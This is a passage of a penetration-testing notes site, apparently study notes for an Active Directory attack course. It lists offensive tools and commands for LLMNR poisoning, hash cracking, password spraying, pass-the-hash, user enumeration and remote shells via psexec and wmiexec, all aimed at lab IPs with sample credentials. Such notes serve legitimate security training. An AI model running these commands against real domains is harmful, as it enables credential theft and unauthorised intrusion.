class=md-ellipsis> Building Attacks </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/sqlmap/db_enumeration/ class=md-nav__link> <span class=md-ellipsis> DB Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/sqlmap/advanced_db_enumeration/ class=md-nav__link> <span class=md-ellipsis> Advanced DB Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/sqlmap/bypassing_web_protections/ class=md-nav__link> <span class=md-ellipsis> Bypassing Web App Protections </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/sqlmap/os_exploitation/ class=md-nav__link> <span class=md-ellipsis> OS Exploitation </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../web/xss/cross_site_scripting/ class=md-nav__link> <span class=md-ellipsis> XSS </span> </a> </li> <li class=md-nav__item> <a href=../../../web/lfi/local_file_inclusion/ class=md-nav__link> <span class=md-ellipsis> Local File Inclusion </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_10 type=checkbox id=__nav_4_3_10> <label class=md-nav__link for=__nav_4_3_10> <span class=md-ellipsis> Documenting & Reporting </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Documenting & Reporting" data-md-level=3> <label class=md-nav__title for=__nav_4_3_10> <span class="md-nav__icon md-icon"></span> Documenting & Reporting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../documentation_and_reporting/preparation/ class=md-nav__link> <span class=md-ellipsis> Preparation </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4 type=checkbox id=__nav_4_4> <label class=md-nav__link for=__nav_4_4> <span class=md-ellipsis> Blue Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Blue Team" data-md-level=2> <label class=md-nav__title for=__nav_4_4> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../file_analysis/useful_links/ class=md-nav__link> <span class=md-ellipsis> File Analysis </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4_2 type=checkbox id=__nav_4_4_2> <label class=md-nav__link for=__nav_4_4_2> <span class=md-ellipsis> Network Traffic Analysis </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Network Traffic Analysis" data-md-level=3> <label class=md-nav__title for=__nav_4_4_2> <span class="md-nav__icon md-icon"></span> Network Traffic Analysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../network_traffic_analysis/layers/ class=md-nav__link> <span class=md-ellipsis> Layers </span> </a> </li> <li class=md-nav__item> <a href=../../../network_traffic_analysis/analysis/ class=md-nav__link> <span class=md-ellipsis> Analysis </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4_2_3 type=checkbox id=__nav_4_4_2_3> <label class=md-nav__link for=__nav_4_4_2_3> <span class=md-ellipsis> Tcpdump </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tcpdump data-md-level=4> <label class=md-nav__title for=__nav_4_4_2_3> <span class="md-nav__icon md-icon"></span> Tcpdump </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../network_traffic_analysis/tcpdump_fundamentals/ class=md-nav__link> <span class=md-ellipsis> Fundamentals </span> </a> </li> <li class=md-nav__item> <a href=../../../network_traffic_analysis/tcpdump_packet_filtering/ class=md-nav__link> <span class=md-ellipsis> Packet Filtering </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4_2_4 type=checkbox id=__nav_4_4_2_4> <label class=md-nav__link for=__nav_4_4_2_4> <span class=md-ellipsis> Wireshark </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Wireshark data-md-level=4> <label class=md-nav__title for=__nav_4_4_2_4> <span class="md-nav__icon md-icon"></span> Wireshark </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../network_traffic_analysis/wireshark_analysis/ class=md-nav__link> <span class=md-ellipsis> Analysis </span> </a> </li> <li class=md-nav__item> <a href=../../../network_traffic_analysis/wireshark_advanced_usage/ class=md-nav__link> <span class=md-ellipsis> Advanced Usage </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1 id=tools-of-the-trade>Tools of the Trade<a class=headerlink href=#tools-of-the-trade title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Tool</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>PowerView</a>/<a href=https://github.com/dmchell/SharpView>SharpView</a></td> <td>A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows <code>net*</code> commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.</td> </tr> <tr> <td><a href=https://github.com/BloodHoundAD/BloodHound>BloodHound</a></td> <td>Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the <a href=https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors>SharpHound</a> PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a <a href=https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors>Neo4j</a> database for graphical analysis of the AD environment.</td> </tr> <tr> <td><a href=https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors>SharpHound</a></td> <td>The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.</td> </tr> <tr> <td><a href=https://github.com/fox-it/BloodHound.py>BloodHound.py</a></td> <td>A Python-based BloodHound ingestor based on the <a href=https://github.com/CoreSecurity/impacket/ >Impacket toolkit</a>. It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis.</td> </tr> <tr> <td><a href=https://github.com/ropnop/kerbrute>Kerbrute</a></td> <td>A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket>Impacket toolkit</a></td> <td>A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.</td> </tr> <tr> <td><a href=https://github.com/lgandx/Responder>Responder</a></td> <td>Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions.</td> </tr> <tr> <td><a href=https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1>Inveigh.ps1</a></td> <td>Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.</td> </tr> <tr> <td><a href=https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh>C# Inveigh (InveighZero)</a></td> <td>The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes.</td> </tr> <tr> <td><a href=https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html>rpcclient</a></td> <td>A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.</td> </tr> <tr> <td><a href=https://github.com/byt3bl33d3r/CrackMapExec>CrackMapExec (CME)</a></td> <td>CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL.</td> </tr> <tr> <td><a href=https://github.com/GhostPack/Rubeus>Rubeus</a></td> <td>Rubeus is a C# tool built for Kerberos Abuse.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py>GetUserSPNs.py</a></td> <td>Another Impacket module geared towards finding Service Principal names tied to normal users.</td> </tr> <tr> <td><a href=https://hashcat.net/hashcat/ >Hashcat</a></td> <td>A great hashcracking and password recovery tool.</td> </tr> <tr> <td><a href=https://github.com/CiscoCXSecurity/enum4linux>enum4linux</a></td> <td>A tool for enumerating information from Windows and Samba systems.</td> </tr> <tr> <td><a href=https://github.com/cddmp/enum4linux-ng>enum4linux-ng</a></td> <td>A rework of the original Enum4linux tool that works a bit differently.</td> </tr> <tr> <td><a href=https://linux.die.net/man/1/ldapsearch>ldapsearch</a></td> <td>Built in interface for interacting with the LDAP protocol.</td> </tr> <tr> <td><a href=https://github.com/ropnop/windapsearch>windapsearch</a></td> <td>A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.</td> </tr> <tr> <td><a href=https://github.com/dafthack/DomainPasswordSpray>DomainPasswordSpray.ps1</a></td> <td>DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.</td> </tr> <tr> <td><a href=https://github.com/leoloobeek/LAPSToolkit>LAPSToolkit</a></td> <td>The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).</td> </tr> <tr> <td><a href=https://github.com/ShawnDEvans/smbmap>smbmap</a></td> <td>SMB share enumeration across a domain.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py>psexec.py</a></td> <td>Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py>wmiexec.py</a></td> <td>Part of Impacket toolset, it provides the capability of command execution over WMI.</td> </tr> <tr> <td><a href=https://github.com/SnaffCon/Snaffler>Snaffler</a></td> <td>Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py>smbserver.py</a></td> <td>Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.</td> </tr> <tr> <td><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)">setspn.exe</a></td> <td>Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.</td> </tr> <tr> <td><a href=https://github.com/ParrotSec/mimikatz>Mimikatz</a></td> <td>Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py>secretsdump.py</a></td> <td>Remotely dump SAM and LSA secrets from a host.</td> </tr> <tr> <td><a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a></td> <td>Provides us with an interactive shell on host over the WinRM protocol.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py>mssqlclient.py</a></td> <td>Part of Impacket toolset, it provides the ability to interact with MSSQL databases.</td> </tr> <tr> <td><a href=https://github.com/Ridter/noPac>noPac.py</a></td> <td>Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py>rpcdump.py</a></td> <td>Part of the Impacket toolset, RPC endpoint mapper.</td> </tr> <tr> <td><a href=https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py>CVE-2021-1675.py</a></td> <td>Printnightmare PoC in python.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py>ntlmrelayx.py</a></td> <td>Part of the Impacket toolset, it performs SMB relay attacks.</td> </tr> <tr> <td><a href=https://github.com/topotam/PetitPotam>PetitPotam.py</a></td> <td>PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.</td> </tr> <tr> <td><a href=https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py>gettgtpkinit.py</a></td> <td>Tool for manipulating certificates and TGTs.</td> </tr> <tr> <td><a href=https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py>getnthash.py</a></td> <td>This tool will use an existing TGT to request a PAC for the current user using U2U.</td> </tr> <tr> <td><a href=https://github.com/dirkjanm/adidnsdump>adidnsdump</a></td> <td>A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer.</td> </tr> <tr> <td><a href=https://github.com/t0thkr1s/gpp-decrypt>gpp-decrypt</a></td> <td>Extracts usernames and passwords from Group Policy preferences.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py>GetNPUsers.py</a></td> <td>Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py>lookupsid.py</a></td> <td>SID bruteforcing tool.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py>ticketer.py</a></td> <td>A tool for creation and customization of TGT/TGS tickets.</td> </tr> <tr> <td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py>raiseChild.py</a></td> <td>Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation.</td> </tr> <tr> <td><a href=https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer>Active Directory Explorer</a></td> <td>Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.</td> </tr> <tr> <td><a href=https://www.pingcastle.com/documentation/ >PingCastle</a></td> <td>Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on <a href=https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration>CMMI</a> adapted to AD security).</td> </tr> <tr> <td><a href=https://github.com/Group3r/Group3r>Group3r</a></td> <td>Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).</td> </tr> <tr> <td><a href=https://github.com/adrecon/ADRecon>ADRecon</a></td> <td>A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.</td> </tr> </tbody> </table> <h1 id=initial-enumeration>Initial Enumeration<a class=headerlink href=#initial-enumeration title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>nslookup ns1.LEGALCORP.com</code></td> <td>Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.</td> </tr> <tr> <td><code>sudo tcpdump -i ens224</code></td> <td>Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host.</td> </tr> <tr> <td><code>sudo responder -I ens224 -A</code></td> <td>Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the<code>-I</code> option and operating in <code>Passive Analysis</code> mode which is activated using <code>-A</code>. Performed from a Linux-based host</td> </tr> <tr> <td><code>fping -asgq 172.16.5.0/23</code></td> <td>Performs a ping sweep on the specified network segment from a Linux-based host.</td> </tr> <tr> <td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td> <td>Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host</td> </tr> <tr> <td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td> <td>Uses <code>git</code> to clone the kerbrute tool from a Linux-based host.</td> </tr> <tr> <td><code>make help</code></td> <td>Used to list compiling options that are possible with <code>make</code> from a Linux-based host.</td> </tr> <tr> <td><code>sudo make all</code></td> <td>Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures.</td> </tr> <tr> <td><code>./kerbrute_linux_amd64</code></td> <td>Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host.</td> </tr> <tr> <td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td> <td>Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.</td> </tr> <tr> <td><code>./kerbrute_linux_amd64 userenum -d legalcorp.local --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td> <td>Runs the Kerbrute tool to discover usernames in the domain (<code>legalcorp.local</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host.</td> </tr> </tbody> </table> <h1 id=llmnrntb-ns-poisoning>LLMNR/NTB-NS Poisoning<a class=headerlink href=#llmnrntb-ns-poisoning title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>responder -h</code></td> <td>Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host.</td> </tr> <tr> <td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td> <td>Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist.</td> </tr> <tr> <td><code>Import-Module .\Inveigh.ps1</code></td> <td>Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>.</td> </tr> <tr> <td><code>(Get-Command Invoke-Inveigh).Parameters</code></td> <td>Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host.</td> </tr> <tr> <td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td> <td>Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file.</td> </tr> <tr> <td><code>.\Inveigh.exe</code></td> <td>Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host.</td> </tr> <tr> <td><code>$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}</code></td> <td>PowerShell script used to disable NBT-NS on a Windows host.</td> </tr> </tbody> </table> <h1 id=password-spraying-password-policies>Password Spraying &amp; Password Policies<a class=headerlink href=#password-spraying-password-policies title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done</code></td> <td>Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host.</td> </tr> <tr> <td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td> <td>Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host.</td> </tr> <tr> <td><code>rpcclient -U "" -N 172.16.5.5</code></td> <td>Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host.</td> </tr> <tr> <td><code>rpcclient $&gt; querydominfo</code></td> <td>Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>enum4linux -P 172.16.5.5</code></td> <td>Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>enum4linux-ng -P 172.16.5.5 -oA lcorp</code></td> <td>Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option.</td> </tr> <tr> <td><code>ldapsearch -h 172.16.5.5 -x -b "DC=LEGALCORP,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength</code></td> <td>Uses <code>ldapsearch</code> to enumerate the password policy in a target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>net accounts</code></td> <td>Used to enumerate the password policy in a Windows domain from a Windows-based host.</td> </tr> <tr> <td><code>Import-Module .\PowerView.ps1</code></td> <td>Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainPolicy</code></td> <td>Used to enumerate the password policy in a target Windows domain from a Windows-based host.</td> </tr> <tr> <td><code>enum4linux -U 172.16.5.5 \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"</code></td> <td>Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host.</td> </tr> <tr> <td><code>rpcclient -U "" -N 172.16.5.5 rpcclient $&gt; enumdomuser</code></td> <td>Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>crackmapexec smb 172.16.5.5 --users</code></td> <td>Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>ldapsearch -h 172.16.5.5 -x -b "DC=LEGALCORP,DC=LOCAL" -s sub "(&amp;(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "</code></td> <td>Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host.</td> </tr> <tr> <td><code>./windapsearch.py --dc-ip 172.16.5.5 -u "" -U</code></td> <td>Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done</code></td> <td>Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner.</td> </tr> <tr> <td><code>kerbrute passwordspray -d legalcorp.local --dc 172.16.5.5 valid_users.txt Welcome1</code></td> <td>Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +</code></td> <td>Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>.</td> </tr> <tr> <td><code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td> <td>Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host.</td> </tr> <tr> <td><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +</code></td> <td>Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>.</td> </tr> <tr> <td><code>Import-Module .\DomainPasswordSpray.ps1</code></td> <td>Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code> from a Windows-based host.</td> </tr> <tr> <td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td> <td>Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host.</td> </tr> </tbody> </table> <h1 id=enumerating-security-controls>Enumerating Security Controls<a class=headerlink href=#enumerating-security-controls title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>Get-MpComputerStatus</code></td> <td>PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code> from a Windows-based host.</td> </tr> <tr> <td><code>Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections</code></td> <td>PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host.</td> </tr> <tr> <td><code>$ExecutionContext.SessionState.LanguageMode</code></td> <td>PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Find-LAPSDelegatedGroups</code></td> <td>A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host.</td> </tr> <tr> <td><code>Find-AdmPwdExtendedRights</code></td> <td>A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-LAPSComputers</code></td> <td>A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.</td> </tr> </tbody> </table> <h1 id=credentialed-enumeration>Credentialed Enumeration<a class=headerlink href=#credentialed-enumeration title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>xfreerdp /u:forend@legalcorp.local /p:Klmcargo2 /v:172.16.5.25</code></td> <td>Connects to a Windows target using valid credentials. Performed from a Linux-based host.</td> </tr> <tr> <td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td> <td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host.</td> </tr> <tr> <td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td> <td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host.</td> </tr> <tr> <td><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td> <td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host.</td> </tr> <tr> <td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td> <td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host.</td> </tr> <tr> <td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td> <td>Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files. The results are outputted in <code>JSON</code>. Performed from a Linux-based host.</td> </tr> <tr> <td><code>smbmap -u forend -p Klmcargo2 -d legalcorp.local -H 172.16.5.5</code></td> <td>Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host.</td> </tr> <tr> <td><code>smbmap -u forend -p Klmcargo2 -d legalcorp.local -H 172.16.5.5 -R SYSVOL --dir-only</code></td> <td>Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host.</td> </tr> <tr> <td><code>rpcclient $&gt; queryuser 0x457</code></td> <td>Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host.</td> </tr> <tr> <td><code>rpcclient $&gt; enumdomusers</code></td> <td>Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host.</td> </tr> <tr> <td><code>psexec.py legalcorp.local/wley:'transporter@4'@172.16.5.125</code></td> <td>Impacket tool used to connect to the <code>CLI</code> of a Windows target via the <code>ADMIN$</code> administrative share with valid credentials. Performed from a Linux-based host.</td> </tr> <tr> <td><code>wmiexec.py legalcorp.local/wley:'transporter@4'@172.16.5.5</code></td> <td>Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host.</td> </tr> <tr> <td><code>windapsearch.py -h</code></td> <td>Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.</td> </tr> <tr> <td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u LEGALCORP\wley -p Klmcargo2 --da</code></td> <td>Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.</td> </tr> <tr> <td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u LEGALCORP\wley -p Klmcargo2 -PU</code></td> <td>Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host.</td> </tr> <tr> <td><code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d legalcorp.local -c all</code></td> <td>Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>legalcorp.local</code>) as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host.</td> </tr> </tbody> </table> <h1 